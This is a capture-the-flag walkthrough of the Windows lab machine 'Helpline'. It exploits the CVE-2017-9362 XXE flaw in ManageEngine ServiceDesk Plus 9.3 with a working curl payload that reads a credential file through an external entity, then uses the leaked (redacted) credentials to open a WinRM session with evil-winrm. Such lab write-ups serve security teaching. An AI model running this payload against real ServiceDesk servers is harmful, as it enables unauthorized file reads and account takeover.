## Overview

Helpline is a hard-difficulty Windows box built around a help-desk web application. The front-facing service on port 8080 is ManageEngine ServiceDesk Plus (SDP) version 9.3, which is vulnerable to an XML External Entity (XXE) flaw in its CMDB API. A crafted XML request turns the parser into an arbitrary file-read primitive, and a conveniently placed "Password Audit" file on disk leaks a working local account. That account gets us a remote session over WinRM. This post stops at the user flag.

Foothold is almost entirely a named public CVE (CVE-2017-9362 ManageEngine XXE file-read) feeding leaked creds straight to WinRM, so CVE dominates with minimal custom effort.

## Recon

| Port  | Service | Notes |
|-------|---------|-------|
| 445   | SMB     | Guest auth denied |
| 5985  | WinRM   | Remote management |
| 8080  | HTTP    | ManageEngine ServiceDesk Plus 9.3 |

```bash
nmap -sC -sV -p445,5985,8080 10.129.96.159
```

The web app on 8080 is the obvious entry point — the SMB share rejects guest authentication, and WinRM is only useful once we have credentials.

## Enumeration

ServiceDesk Plus accepts the default `guest` / `guest` login. Browsing the Solutions/tickets reveals a "Password Audit" entry with an `.xlsx` attachment. Opening it in a spreadsheet viewer and unhiding sheets (`View > Hidden Sheets > Password Data`) exposes the on-disk location of the audit file:

```
C:\Temp\Password Audit\it_logins.txt
```

The login page footer also confirms the build: **SDP 9.3**, which maps directly to a published XXE vulnerability.

## Foothold

SDP 9.3's CMDB API (`/api/cmdb/ci`) parses attacker-supplied XML in the `INPUT_DATA` parameter without disabling external entities — **CVE-2017-9362**. We declare a `SYSTEM` entity pointing at the audit file we found, and its contents come back reflected in the `CI Name` field:

```bash
curl -s -X POST "http://10.129.96.159:8080/api/cmdb/ci" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "INPUT_DATA=<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Temp/Password Audit/it_logins.txt\">]><API version='1.0' locale='en'><records><record><parameter><name>CI Name</name><value>&xxe;</value></parameter></record></records></API>"
```

The file is a leftover credential audit and includes a live local Windows account (`<user>` / `<redacted>`). Those credentials authenticate straight over WinRM:

```bash
evil-winrm -i 10.129.96.159 -u <user> -p '<redacted>'
```

We land an interactive session on the host.

## User flag

```bash
type C:\Users\<user>\Desktop\user.txt   # HTB{...}
```

Initial access achieved via the SDP XXE and a remote WinRM session.

Privilege escalation is left as an exercise — this post stops at user.
